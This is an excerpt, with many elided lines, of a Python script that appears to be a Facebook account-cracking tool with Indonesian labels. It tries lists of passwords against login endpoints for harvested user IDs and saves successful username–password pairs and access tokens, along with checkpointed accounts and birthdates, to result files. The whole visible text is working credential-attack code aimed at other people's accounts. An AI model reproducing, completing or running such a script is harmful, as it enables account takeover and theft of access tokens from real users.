    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('[Hoki ngab] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
                ...
                try:
                    ...
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Hoki ngab] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("[Hoki ngab] %s • %s\n"%(user,pw))
                break
                continue
        loop += 1
	...
	for pas in pwx:
		...
		try:
			...
			with requests.Session() as ses:
				...
				# print ("\r",data)
				# print ("\r[Hoki ngab] %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					...
					print('\r %s[Retakan] %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
